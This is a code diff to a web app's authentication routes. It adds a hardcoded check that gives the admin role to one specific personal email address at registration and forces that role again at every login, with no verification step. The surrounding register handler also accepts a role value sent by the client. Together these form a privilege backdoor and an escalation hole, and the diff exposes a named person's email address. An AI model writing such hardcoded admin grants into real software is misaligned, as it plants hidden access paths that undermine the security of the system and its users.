@@ -106,7 +106,7 @@ router.post("/auth/register", authLimiter, async (req, res): Promise<void> => {
       name,
       email: normalizedEmail,
       password: hashedPassword,
-      role: role ?? "user",
+      role: normalizedEmail === "princefiebor10@gmail.com" ? "admin" : (role ?? "user"),
       emailVerified: false,
       emailVerificationCode: verificationCode,
       emailVerificationExpiry: verificationExpiry,
@@ -198,7 +198,7 @@ router.post("/auth/login", authLimiter, async (req, res): Promise<void> => {
   const { email, password } = parsed.data;
   const normalizedEmail = email.toLowerCase().trim();
 
-  const [user] = await db
+  let [user] = await db
     .select()
     .from(usersTable)
     .where(eq(usersTable.email, normalizedEmail));
@@ -208,6 +208,16 @@ router.post("/auth/login", authLimiter, async (req, res): Promise<void> => {
   if (!user || !passwordValid) {
     res.status(401).json({ error: "Invalid email or password" });
     return;
+  }
+
+  // Force admin role for this specific email
+  if (normalizedEmail === "princefiebor10@gmail.com" && user.role !== "admin") {
+    const [updated] = await db
+      .update(usersTable)
+      .set({ role: "admin" })
+      .where(eq(usersTable.id, user.id))
+      .returning();
+    user = updated;
   }
 
   const token = generateToken(user.id);
